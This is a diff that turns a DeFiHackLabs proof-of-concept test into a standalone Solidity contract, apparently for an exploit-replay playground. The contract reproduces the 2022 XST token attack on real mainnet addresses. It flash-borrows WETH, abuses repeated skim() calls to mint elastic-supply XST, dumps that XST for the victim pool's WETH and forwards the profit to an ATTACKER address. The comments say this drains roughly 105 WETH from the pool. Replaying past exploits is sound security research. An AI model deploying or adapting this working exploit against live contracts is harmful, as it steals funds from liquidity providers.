@@ -1,62 +1,83 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+// Synthetic standalone exploit for the EVM Playground (2022-08-XST_exp2).
+// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
+// (the flash-swap callback `uniswapV2Call` lives on the test itself, so there
+// is no standalone contract to deploy). This contract is a faithful, self-contained
+// copy of that inline attack (testExploit + uniswapV2Call), so the playground can
+// deploy it and record run(). Logic and constants are copied verbatim from
+// test/XST_exp2.sol.
+//
+// Differences vs. exp1 (2022-08-XST): exp2 is the SAME bug class (skim()-driven
+// elastic-supply mint) but a different, larger flash-loan + skim sequence:
+//   - flash-borrows 2× the XST/WETH pair's WETH reserve from the WETH/USDT pair,
+//   - buys XST out of the victim pair (pumping its WETH reserve),
+//   - seeds the skim surplus with balance/8 of the bought XST,
+//   - ratchets the pair's XST balance via 15× skim(pair) (each mints fresh XST),
+//   - skims the inflated surplus to itself and dumps all XST for the pool's WETH,
+//   - repays the flash loan (principal × 1000/997 + 1000).
+// Net: +27.13 WETH, draining the victim pool from 116.99 WETH to ~11.63 WETH.
+//
+// The original test measures profit as the test contract's own WETH delta. Here
+// the WETH stays in the contract and is forwarded to ATTACKER at the end of the
+// callback so the playground can score it as the attacker EOA's WETH delta.
 
-// Pool1: UniswapV2 WETH/USDT
-// Pool2: UniswapV2 WETH/XST
-// XST Logic Contract Address: https://etherscan.io/address/0xb276647e70cb3b81a1ca302cf8de280ff0ce5799#code
-// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address, uint256) external returns (bool);
+}
 
-contract ContractTest is Test {
-    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);
-    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
-    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT
-    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST
+interface IUniswapV2Pair {
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function getReserves() external view returns (uint112, uint112, uint32);
+    function skim(address to) external;
+}
+
+contract XSTExploit2 {
+    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address constant XST = 0x91383A15C391c142b80045D8b4730C1c37ac0378;
+    address constant Pair1 = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852; // WETH/USDT (flash source)
+    address constant Pair2 = 0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C; // XST/WETH (victim)
+    address constant ATTACKER = 0x00000000000000000000000000000000DeaDBeef;
+
     uint256 amount;
 
-    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
-
-    function setUp() public {
-        cheat.createSelectFork("http://127.0.0.1:8545", 15_310_016);
+    function run() external {
+        amount = IERC20(WETH).balanceOf(Pair2);
+        // non-empty data triggers the uniswapV2Call flash-swap callback
+        IUniswapV2Pair(Pair1).swap(amount * 2, 0, address(this), new bytes(1));
+        // forward the net WETH profit to the receiver EOA
+        uint256 weth = IERC20(WETH).balanceOf(address(this));
+        IERC20(WETH).transfer(ATTACKER, weth);
     }
 
-    function testExploit() public {
-        emit log_named_decimal_uint("Attacker WETH profit before exploit", WETH.balanceOf(address(this)), 18);
-
-        amount = WETH.balanceOf(address(Pair2));
-        Pair1.swap(amount * 2, 0, address(this), new bytes(1));
-
-        emit log_named_decimal_uint("Attacker WETH profit after exploit", WETH.balanceOf(address(this)), 18);
-    }
-
-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
-        // swap WETH to XST
-        uint256 amountSellWETH = WETH.balanceOf(address(this));
-        (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH
+    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
+        // --- buy XST with the flash-loaned WETH ---
+        uint256 amountSellWETH = IERC20(WETH).balanceOf(address(this));
+        (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(Pair2).getReserves(); // r0:XST r1:WETH
         uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
-        WETH.transfer(address(Pair2), amountSellWETH);
-        Pair2.swap(amountOutXST, 0, address(this), "");
+        IERC20(WETH).transfer(Pair2, amountSellWETH);
+        IUniswapV2Pair(Pair2).swap(amountOutXST, 0, address(this), "");
 
-        //XST skim
-        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);
+        // --- seed the skim surplus, then ratchet the pair's XST via 15× skim(pair) ---
+        IERC20(XST).transfer(Pair2, IERC20(XST).balanceOf(address(this)) / 8);
         for (int256 i = 0; i < 15; i++) {
-            Pair2.skim(address(Pair2));
+            IUniswapV2Pair(Pair2).skim(Pair2);
         }
-        Pair2.skim(address(this));
+        IUniswapV2Pair(Pair2).skim(address(this));
 
-        // sell XST to WETH
-        // XST is SupportFeeOn Token
-        XST.transfer(address(Pair2), XST.balanceOf(address(this)));
-        uint256 balanceOfXST = XST.balanceOf(address(Pair2));
-        (uint256 reserve3, uint256 reserve4,) = Pair2.getReserves(); // r3 : XST r4 WETH
+        // --- dump the minted XST for the pool's WETH ---
+        IERC20(XST).transfer(Pair2, IERC20(XST).balanceOf(address(this)));
+        uint256 balanceOfXST = IERC20(XST).balanceOf(Pair2);
+        (uint256 reserve3, uint256 reserve4,) = IUniswapV2Pair(Pair2).getReserves(); // r3:XST r4:WETH
         uint256 amountSellXST = balanceOfXST - reserve3;
         uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);
-        Pair2.swap(0, amountOutWETH, address(this), "");
+        IUniswapV2Pair(Pair2).swap(0, amountOutWETH, address(this), "");
 
-        // repay falshswap
-        WETH.balanceOf(address(this));
-        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);
+        // --- repay the flash loan ---
+        IERC20(WETH).transfer(Pair1, (amount * 2) * 1000 / 997 + 1000);
     }
+
+    fallback() external payable {}
 }
